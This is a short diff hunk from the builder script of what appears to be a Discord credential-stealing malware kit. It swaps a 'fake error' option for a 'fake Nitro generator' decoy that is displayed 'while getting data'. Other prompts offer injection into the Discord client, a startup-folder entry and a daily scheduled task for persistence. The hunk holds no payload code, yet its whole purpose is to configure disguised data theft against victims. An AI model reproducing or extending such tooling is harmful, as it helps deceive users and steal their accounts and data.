@@ -136,7 +136,7 @@ while True:
 
     Debug = get_boolean_input('Enable Debugging (Useful to share error (Will print and save error in a txt file)) Y/N: ')
     FakeWeb = get_boolean_input('Enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
-    FakeError = get_boolean_input('Enable Fake Error (When the file is launched it will show a error)  Y/N: ')
+    FakeGen = get_boolean_input('Enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
     Injection = get_boolean_input('Inject the script to discord Startup Y/N: ')
     Startup = get_boolean_input('Add the file to the startup folder? Y/N: ')
     Schedule = get_boolean_input('Add an schedule task ? (execute it every day!) Y/N: ')
